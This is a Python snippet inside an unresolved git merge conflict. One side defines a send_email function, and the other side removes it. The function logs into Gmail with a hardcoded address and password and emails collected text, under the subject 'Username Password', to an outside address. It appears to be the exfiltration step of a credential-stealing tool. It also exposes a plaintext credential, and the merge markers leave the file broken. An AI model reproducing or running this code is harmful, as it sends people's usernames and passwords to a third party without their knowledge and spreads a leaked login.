<<<<<<< HEAD
def send_email():
    # You can use the following email
    # to send your emails.
    gmail_user = 'helpmewithmycodinghomework@gmail.com'
    gmail_password = 'himynameistravis'

    sent_from = gmail_user
    to = ['therealrp231@gmail.com']

    subject = 'Username Password'
    body = getText()

    print(body)

    email_text = """\
        From: %s
        To: %s
        Subject: %s

        %s
        """ % (sent_from, ", ".join(to), subject, body)

    print(email_text)

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, email_text)
        server.close()
        print('Email sent!')
    except:
        print('Something went wrong...')
=======

>>>>>>> 9d9dcbf58fcdde3af8c435edadb141ee5d9d624f
